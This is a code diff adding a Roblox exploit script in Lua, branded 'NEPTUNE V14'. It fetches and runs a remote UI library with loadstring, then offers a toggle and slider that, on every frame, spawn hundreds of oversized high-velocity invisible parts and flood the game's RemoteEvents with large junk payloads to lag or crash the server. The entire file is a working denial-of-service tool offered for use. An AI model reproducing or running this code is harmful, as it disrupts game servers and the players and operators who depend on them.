@@ -1,0 +1,97 @@
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+   Name = "qazqazqaz - NEPTUNE V14",
+   LoadingTitle = "qazqazqaz EXTREME ENGINE",
+   LoadingSubtitle = "by qazqazqaz",
+   ConfigurationSaving = {
+      Enabled = false
+   },
+   KeySystem = false -- Set to true if you want a key system
+})
+
+local Tab = Window:CreateTab("qaz_Control", 4483362458)
+local Section = Tab:CreateSection("qazqazqaz_OVERLOAD_SYSTEM")
+
+getgenv().EXEC_ACTIVE = false
+getgenv().POWER_LEVEL = 50000
+
+-- [[ qazqazqaz UI CONTROLS ]]
+
+Tab:CreateToggle({
+   Name = "ACTIVATE qaz_LAG",
+   CurrentValue = false,
+   Flag = "qazToggle",
+   Callback = function(Value)
+      getgenv().EXEC_ACTIVE = Value
+      if Value then
+         Rayfield:Notify({
+            Title = "qazqazqaz STATUS",
+            Content = "NEPTUNE OVERLOAD ACTIVE",
+            Duration = 2,
+            Image = 4483362458,
+         })
+      end
+   end,
+})
+
+Tab:CreateSlider({
+   Name = "qaz_POWER",
+   Min = 10000,
+   Max = 300000, -- Increased for more lag
+   DefaultValue = 75000,
+   Color = Color3.fromRGB(150, 0, 0),
+   Increment = 5000,
+   ValueName = "Packets",
+   Callback = function(Value)
+      getgenv().POWER_LEVEL = Value
+   end,
+})
+
+-- [[ qazqazqaz LOGIC KERNEL ]]
+
+local RS = game:GetService("RunService")
+local RP = game:GetService("ReplicatedStorage")
+local LP = game:GetService("Players").LocalPlayer
+
+local function qazExecute()
+    if not getgenv().EXEC_ACTIVE then return end
+    
+    -- PHYSICS OVERLOAD
+    for i = 1, 400 do
+        task.spawn(function()
+            local p = Instance.new("Part")
+            p.Size = Vector3.new(2048, 2048, 2048)
+            p.CFrame = LP.Character.HumanoidRootPart.CFrame
+            p.Velocity = Vector3.new(1e10, 1e10, 1e10)
+            p.Transparency = 1
+            p.Parent = workspace
+            task.wait(0.05)
+            p:Destroy()
+        end)
+    end
+
+    -- PACKET FLOODING
+    local remotes = {}
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") then
+            table.insert(remotes, v)
+            if #remotes >= 15 then break end
+        end
+    end
+
+    for i = 1, getgenv().POWER_LEVEL / 150 do
+        task.spawn(function()
+            for _, remote in pairs(remotes) do
+                remote:FireServer(string.rep("\255", 15000))
+            end
+        end)
+    end
+end
+
+RS.Heartbeat:Connect(function()
+    if getgenv().EXEC_ACTIVE then
+        task.spawn(qazExecute)
+    end
+end)
+
